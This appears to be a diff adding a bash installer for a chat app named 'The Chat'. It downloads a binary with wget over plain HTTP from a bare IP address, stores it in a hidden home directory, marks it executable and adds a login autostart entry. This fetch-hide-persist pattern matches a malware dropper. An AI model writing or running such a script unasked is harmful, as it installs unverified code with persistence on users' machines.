@@ -1,0 +1,27 @@
+#!/bin/bash
+
+# Step 1: Download 'client' from the specified URL and save it to ~/.TheChat
+URL="http://172.16.50.122:51998/download"
+OUTPUT_DIR="$HOME/.TheChat"
+OUTPUT_FILE="$OUTPUT_DIR/client"
+
+mkdir -p "$OUTPUT_DIR"  # Create the directory if it doesn't exist
+wget -O "$OUTPUT_FILE" "$URL"
+chmod +x "$OUTPUT_FILE"
+
+# Step 2: Create a desktop entry file for autostart
+DESKTOP_FILE="$HOME/.config/autostart/thechat.desktop"
+
+cat <<EOL > "$DESKTOP_FILE"
+[Desktop Entry]
+Type=Application
+Exec=$OUTPUT_FILE
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name=The Chat
+Comment=Your description here
+EOL
+
+# Step 3: Check the service status
+echo "Chat app autostart setup complete. To test, log out and back in."
